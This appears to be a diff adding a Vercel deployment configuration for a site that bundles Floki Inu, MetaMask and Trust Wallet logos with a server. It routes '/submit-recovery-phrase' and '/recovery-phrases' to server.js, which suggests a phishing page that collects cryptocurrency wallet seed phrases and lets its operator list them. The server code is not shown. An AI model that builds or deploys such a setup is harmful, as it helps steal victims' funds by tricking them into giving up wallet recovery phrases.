@@ -1,0 +1,84 @@
+{
+  "version": 2,
+  "builds": [
+    {
+      "src": "server.js",
+      "use": "@vercel/node"
+    },
+    {
+      "src": "index.html",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "styles.css",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "yi83ya3a.png",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "floki-inu-floki-logos",
+      "use": "@vercel/static"
+    },
+    {
+      "src" : "GOquKoWWoAEPecp",
+      "use" :  "@vercel/static"
+    },
+    {
+      "src" : "metamask",
+      "use" :  "@vercel/static"
+    },
+    {
+      "src" : "trustwalletlogo",
+      "use" :  "@vercel/static"
+    },
+    {
+      "src" : "tv-ad",
+      "use" :  "@vercel/static"
+    }
+  ],
+  "routes": [
+    {
+      "src": "/",
+      "dest": "/index.html"
+    },
+    {
+      "src": "/styles.css",
+      "dest": "/styles.css"
+    },
+    {
+      "src": "/submit-recovery-phrase",
+      "dest": "/server.js"
+    },
+    {
+      "src": "/recovery-phrases",
+      "dest": "/server.js"
+    },
+    
+    {
+      "src": "/misc/yi83ya3a.png",
+      "dest": "/work/misc/yi8ya3a.png"
+    },
+    {
+      "src": "/misc/floki-inu-floki-logo.png",
+      "dest": "/work/misc/floki-inu-floki-logo.png"
+    },
+    {
+      "src": "/misc/GOquKoWWoAEPecp.jpg",
+      "dest": "/work/misc/GOquKoWWoAEPecp.jpg"
+    },
+    {
+      "src": "/misc/metamask.jpg",
+      "dest": "/work/misc/metamask.jpg"
+    },
+    {
+      "src": "/misc/tv-ad.mp4",
+      "dest": "/work/misc/tv-ad.mp4"
+    },
+    {
+      "src": "/misc/trustwalletlogo.png",
+      "dest": "/work/misc/trustwalletlogo.png"
+    }
+  ]
+}
